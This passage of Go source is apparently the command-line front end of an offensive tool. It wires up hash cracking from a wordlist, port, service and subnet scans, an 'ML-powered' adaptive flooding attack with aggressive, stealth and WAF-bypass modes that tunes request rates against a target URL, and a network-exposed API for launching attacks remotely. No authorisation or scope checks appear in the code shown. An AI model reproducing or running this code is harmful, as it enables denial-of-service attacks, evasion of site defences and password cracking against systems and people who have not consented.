	fs := flag.NewFlagSet("hash-crack", flag.ExitOnError)
	hash := fs.String("hash", "", "Hash to crack (or file with hashes)")
	hashType := fs.String("type", "md5", "Hash type: md5, sha1, sha256, sha512")
	wordlist := fs.String("wordlist", "wordlists/passwords.txt", "Password wordlist")
	threads := fs.Int("threads", 10, "Number of threads")
	fs.Parse(os.Args[2:])

	if *hash == "" {
		color.Red("❌ Hash is required")
		fs.PrintDefaults()
		os.Exit(1)
		return
	}

	cracker := exploitation.NewHashCracker(*hashType, *threads)
	cracker.Wordlist = *wordlist

	// Check if it's a file or single hash
	if _, err := os.Stat(*hash); err == nil {
		cracker.AddHashesFromFile(*hash)
	} else {
		cracker.AddHash(*hash)
	}

	if err := cracker.Crack(); err != nil {
		color.Red("❌ Hash cracking failed: %v", err)
		os.Exit(1)
		return
	}
}

// Network Functions
func runPortScan() {
	fs := flag.NewFlagSet("port-scan", flag.ExitOnError)
	target := fs.String("target", "", "Target host/IP")
	ports := fs.String("ports", "", "Port range (e.g., 1-1000 or 80,443,8080)")
	threads := fs.Int("threads", 50, "Number of threads")
	topPorts := fs.Int("top-ports", 0, "Scan top N common ports")
	_ = fs.Int("timeout", 5, "Timeout per port in seconds")
	fs.Parse(os.Args[2:])

	if *target == "" {
		color.Red("❌ Target is required")
		fs.PrintDefaults()
		os.Exit(1)
		return
	}

	portScanner := network.NewPortScanner(*target, *threads)

	if *topPorts > 0 {
		portScanner.SetTopPorts(*topPorts)
		if err := portScanner.Scan(); err != nil {
			color.Red("❌ Port scan failed: %v", err)
			os.Exit(1)
			return
		}
	} else if *ports != "" {
		portScanner.SetPorts(*ports)
		if err := portScanner.Scan(); err != nil {
			color.Red("❌ Port scan failed: %v", err)
			os.Exit(1)
			return
		}
	} else {
		color.Red("❌ Specify -ports or -top-ports")
		fs.PrintDefaults()
		os.Exit(1)
		return
	}
}

func runServiceEnum() {
	fs := flag.NewFlagSet("service-enum", flag.ExitOnError)
	target := fs.String("target", "", "Target host/IP")
	ports := fs.String("ports", "", "Ports to enumerate (e.g., 22,80,443)")
	threads := fs.Int("threads", 10, "Number of threads")
	fs.Parse(os.Args[2:])

	if *target == "" {
		color.Red("❌ Target is required")
		fs.PrintDefaults()
		os.Exit(1)
		return
	}

	// First do a port scan to find open ports
	scanner := network.NewPortScanner(*target, *threads)
	scanner.ServiceEnum = true

	if *ports != "" {
		scanner.SetPorts(*ports)
	} else {
		scanner.SetTopPorts(30)
	}

	if err := scanner.Scan(); err != nil {
		color.Red("❌ Port scan failed: %v", err)
		os.Exit(1)
		return
	}

	if len(scanner.Results) > 0 {
		enum := network.NewServiceEnumerator(*target, scanner.Results)
		if err := enum.Enumerate(); err != nil {
			color.Red("❌ Service enumeration failed: %v", err)
			os.Exit(1)
			return
		}
	}

	color.Green("✅ Service enumeration completed")
}

func runSubnetScan() {
	fs := flag.NewFlagSet("subnet-scan", flag.ExitOnError)
	subnet := fs.String("subnet", "", "Subnet to scan (e.g., 192.168.1.0/24)")
	threads := fs.Int("threads", 50, "Number of threads")
	fs.Parse(os.Args[2:])

	if *subnet == "" {
		color.Red("❌ Subnet is required")
		fs.PrintDefaults()
		os.Exit(1)
		return
	}

	scanner := network.NewSubnetScanner(*subnet, *threads)

	if err := scanner.Scan(); err != nil {
		color.Red("❌ Subnet scan failed: %v", err)
		os.Exit(1)
		return
	}
	color.Green("✅ Subnet scan completed")
}

// ==================== ML INTELLIGENCE FUNCTIONS ====================

func runMLAttack() {
	fs := flag.NewFlagSet("ml-attack", flag.ExitOnError)
	target := fs.String("target", "", "Target URL")
	duration := fs.Int("duration", 300, "Attack duration in seconds")
	learningPhase := fs.Int("learn", 60, "Learning phase duration in seconds")
	aggressive := fs.Bool("aggressive", false, "Enable aggressive mode")
	stealthMode := fs.Bool("stealth", false, "Enable stealth mode with ML evasion")
	fs.Parse(os.Args[2:])

	if *target == "" {
		color.Red("❌ Target is required")
		fs.PrintDefaults()
		os.Exit(1)
		return
	}

	parsedURL, err := url.Parse(*target)
	if err != nil {
		color.Red("❌ Invalid URL: %v", err)
		os.Exit(1)
		return
	}

	// Initialize ML Intelligence
	ai := intelligence.NewAttackIntelligence(parsedURL.Host)

	color.Cyan("\n   ╔════════════════════════════════════════════════════════════╗")
	color.Cyan("   ║          ML-POWERED INTELLIGENT ATTACK v2.0               ║")
	color.Cyan("   ╚════════════════════════════════════════════════════════════╝")
	color.White("   🎯 Target: %s", *target)
	color.White("   ⏱️  Duration: %d seconds", *duration)
	color.White("   📊 Learning Phase: %d seconds", *learningPhase)
	if *aggressive {
		color.Red("   ⚡ Mode: AGGRESSIVE")
	} else if *stealthMode {
		color.Yellow("   🥷 Mode: STEALTH")
	} else {
		color.Green("   🤖 Mode: ADAPTIVE ML")
	}

	// Phase 1: Learning
	color.Yellow("\n   [Phase 1] 📚 Learning target behavior...")
	learnTarget(ai, *target, time.Duration(*learningPhase)*time.Second)

	// Get initial recommendations
	rec := ai.GetRecommendations()
	profile := ai.GetProfile()

	color.Cyan("\n   ┌─────────────────────────────────────────────────────────┐")
	color.Cyan("   │ 🧠 ML ANALYSIS RESULTS                                  │")
	color.Cyan("   ├─────────────────────────────────────────────────────────┤")
	color.White("   │ Optimal RPS: %-44d │", rec.RPS)
	color.White("   │ Optimal Threads: %-40d │", rec.Threads)
	color.White("   │ Best Vector: %-44s │", rec.AttackVector)
	color.White("   │ WAF Detected: %-43v │", profile.WAFPresent)
	if profile.WAFPresent {
		color.Yellow("   │ WAF Type: %-47s │", profile.WAFType)
	}
	color.White("   │ Confidence: %-43.1f%% │", profile.Confidence*100)
	color.White("   │ Predicted Success: %-36.1f%% │", rec.PredictedSuccess*100)
	color.Cyan("   └─────────────────────────────────────────────────────────┘")

	// Phase 2: ML-Optimized Attack
	color.Yellow("\n   [Phase 2] ⚔️  Launching ML-optimized attack...")

	// Apply ML recommendations to adaptive attack
	mode := "find-limit"
	if *aggressive {
		mode = "chaos"
	} else if *stealthMode {
		mode = "sustained"
	}

	config := attacks.AdaptiveConfig{
		Target:     *target,
		Duration:   time.Duration(*duration-*learningPhase) * time.Second,
		Mode:       mode,
		MaxRate:    rec.RPS * 2,
		MaxThreads: rec.Threads * 2,
	}

	if err := attacks.LaunchAdaptive(config); err != nil {
		color.Red("❌ Attack failed: %v", err)
		os.Exit(1)
		return
	}

	// Final report
	stats := ai.GetStats()
	color.Cyan("\n   ╔════════════════════════════════════════════════════════════╗")
	color.Cyan("   ║                  📋 ML ATTACK REPORT                       ║")
	color.Cyan("   ╠════════════════════════════════════════════════════════════╣")
	color.White("   ║ Total Samples Analyzed: %-33v ║", stats["total_samples"])
	color.White("   ║ Final Success Rate: %-36.1f%% ║", stats["recent_success"].(float64)*100)
	color.White("   ║ Vulnerability Score: %-35.2f ║", stats["vulnerability_score"])
	color.White("   ║ Defense Mechanisms: %-37v ║", len(stats["defense_mechanisms"].([]string)))
	color.Cyan("   ╚════════════════════════════════════════════════════════════╝\n")

	color.Green("✅ ML Attack completed successfully")
}

func learnTarget(ai *intelligence.AttackIntelligence, target string, duration time.Duration) {
	client := &http.Client{Timeout: 10 * time.Second}
	endTime := time.Now().Add(duration)
	sampleCount := 0

	for time.Now().Before(endTime) {
		start := time.Now()
		resp, err := client.Get(target)
		elapsed := time.Since(start)

		result := intelligence.AttackResult{
			Timestamp:    time.Now(),
			RequestsSent: 1,
			ResponseTime: elapsed,
			Vector:       "learning",
			StatusCodes:  make(map[int]int),
		}

		if err != nil {
			result.Failed = 1
		} else {
			result.Successful = 1
			result.StatusCodes[resp.StatusCode] = 1
			resp.Body.Close()
		}

		ai.LearnFromResult(result)
		sampleCount++

		// Progress indicator
		if sampleCount%10 == 0 {
			remaining := time.Until(endTime).Round(time.Second)
			fmt.Printf("\r   📊 Samples: %d | Remaining: %s", sampleCount, remaining)
		}

		time.Sleep(100 * time.Millisecond)
	}
	fmt.Println()
}

func runMLAnalyze() {
	fs := flag.NewFlagSet("ml-analyze", flag.ExitOnError)
	target := fs.String("target", "", "Target URL to analyze")
	duration := fs.Int("duration", 120, "Analysis duration in seconds")
	fs.Parse(os.Args[2:])

	if *target == "" {
		color.Red("❌ Target is required")
		fs.PrintDefaults()
		os.Exit(1)
		return
	}

	parsedURL, err := url.Parse(*target)
	if err != nil {
		color.Red("❌ Invalid URL: %v", err)
		os.Exit(1)
		return
	}

	ai := intelligence.NewAttackIntelligence(parsedURL.Host)

	color.Cyan("\n   ╔════════════════════════════════════════════════════════════╗")
	color.Cyan("   ║          ML TARGET ANALYZER - Deep Analysis               ║")
	color.Cyan("   ╚════════════════════════════════════════════════════════════╝")
	color.White("   🎯 Target: %s", *target)
	color.White("   ⏱️  Duration: %d seconds\n", *duration)

	color.Yellow("   [*] Analyzing target with ML intelligence...")
	learnTarget(ai, *target, time.Duration(*duration)*time.Second)

	// Get comprehensive analysis
	profile := ai.GetProfile()
	rec := ai.GetRecommendations()
	stats := ai.GetStats()

	// Print detailed analysis
	color.Cyan("\n   ╔════════════════════════════════════════════════════════════╗")
	color.Cyan("   ║                  🧠 INTELLIGENCE REPORT                    ║")
	color.Cyan("   ╠════════════════════════════════════════════════════════════╣")

	color.Cyan("   ║ TARGET PROFILE                                            ║")
	color.Cyan("   ├────────────────────────────────────────────────────────────┤")
	color.White("   ║ Domain: %-50s ║", profile.Domain)
	color.White("   ║ Avg Response Time: %-38s ║", profile.AverageResponseTime)
	color.White("   ║ Success Rate: %-43.1f%% ║", profile.SuccessRate*100)
	color.White("   ║ Vulnerability Score: %-36.2f ║", profile.VulnerabilityScore)

	color.Cyan("   ├────────────────────────────────────────────────────────────┤")
	color.Cyan("   ║ DEFENSE ANALYSIS                                          ║")
	color.Cyan("   ├────────────────────────────────────────────────────────────┤")
	color.White("   ║ WAF Detected: %-44v ║", profile.WAFPresent)
	if profile.WAFPresent {
		color.Yellow("   ║ WAF Type: %-48s ║", profile.WAFType)
	}
	color.White("   ║ CDN Detected: %-44v ║", profile.CDNPresent)
	if profile.CDNPresent {
		color.White("   ║ CDN Provider: %-44s ║", profile.CDNProvider)
	}
	color.White("   ║ Rate Limit Threshold: %-35d ║", profile.RateLimitThreshold)
	color.White("   ║ Security Headers: %-39d ║", len(profile.SecurityHeaders))
	for _, d := range profile.SecurityHeaders {
		color.Yellow("   ║   - %-53s ║", d)
	}

	color.Cyan("   ├────────────────────────────────────────────────────────────┤")
	color.Cyan("   ║ RECOMMENDATIONS                                           ║")
	color.Cyan("   ├────────────────────────────────────────────────────────────┤")
	color.Green("   ║ Optimal RPS: %-45d ║", rec.RPS)
	color.Green("   ║ Optimal Threads: %-41d ║", rec.Threads)
	color.Green("   ║ Best Attack Vector: %-38s ║", rec.AttackVector)
	color.Green("   ║ Burst Size: %-46d ║", rec.BurstSize)
	color.Green("   ║ Use Proxy: %-47v ║", rec.UseProxy)
	color.Green("   ║ Predicted Success: %-38.1f%% ║", rec.PredictedSuccess*100)
	color.Green("   ║ Confidence: %-46.1f%% ║", rec.Confidence*100)

	if len(rec.EvasionTechniques) > 0 {
		color.Cyan("   ├────────────────────────────────────────────────────────────┤")
		color.Cyan("   ║ EVASION TECHNIQUES                                        ║")
		color.Cyan("   ├────────────────────────────────────────────────────────────┤")
		for _, e := range rec.EvasionTechniques {
			color.Yellow("   ║   ✓ %-53s ║", e)
		}
	}

	if len(rec.WAFBypassMethods) > 0 {
		color.Cyan("   ├────────────────────────────────────────────────────────────┤")
		color.Cyan("   ║ WAF BYPASS METHODS                                        ║")
		color.Cyan("   ├────────────────────────────────────────────────────────────┤")
		for _, w := range rec.WAFBypassMethods {
			color.Red("   ║   ⚡ %-52s ║", w)
		}
	}

	color.Cyan("   ├────────────────────────────────────────────────────────────┤")
	color.Cyan("   ║ ML STATISTICS                                             ║")
	color.Cyan("   ├────────────────────────────────────────────────────────────┤")
	color.White("   ║ Samples Analyzed: %-39v ║", stats["total_samples"])
	color.White("   ║ Trend: %-51.4f ║", stats["trend"])
	color.White("   ║ Variance: %-48.4f ║", stats["variance"])
	color.White("   ║ Confidence: %-45.1f%% ║", stats["confidence"].(float64)*100)
	color.White("   ║ Best Time of Day: %-39d:00 ║", stats["best_time_of_day"])

	color.Cyan("   ╚════════════════════════════════════════════════════════════╝\n")

	color.Green("✅ Analysis completed")
}

func runAPIServer() {
	fs := flag.NewFlagSet("api-server", flag.ExitOnError)
	port := fs.Int("port", 8080, "API server port")
	host := fs.String("host", "0.0.0.0", "API server host")
	fs.Parse(os.Args[2:])

	color.Cyan("\n   ╔════════════════════════════════════════════════════════════╗")
	color.Cyan("   ║          ATTACK TOOL API SERVER v1.0                      ║")
	color.Cyan("   ╚════════════════════════════════════════════════════════════╝")
	color.White("   🌐 Starting API server on %s:%d", *host, *port)
	color.Yellow("   📚 API Endpoints:")
	color.White("      POST /attack/adaptive    - Launch adaptive attack")
	color.White("      POST /attack/ml          - Launch ML attack")
	color.White("      POST /scan/port          - Port scan")
	color.White("      POST /scan/web           - Web vulnerability scan")
	color.White("      GET  /health             - Health check")
	color.White("      GET  /stats              - Get statistics\n")

	server := api.NewAPIServer(*host, *port)
	if err := server.Start(); err != nil {
		color.Red("❌ Failed to start API server: %v", err)
		os.Exit(1)
	}
}
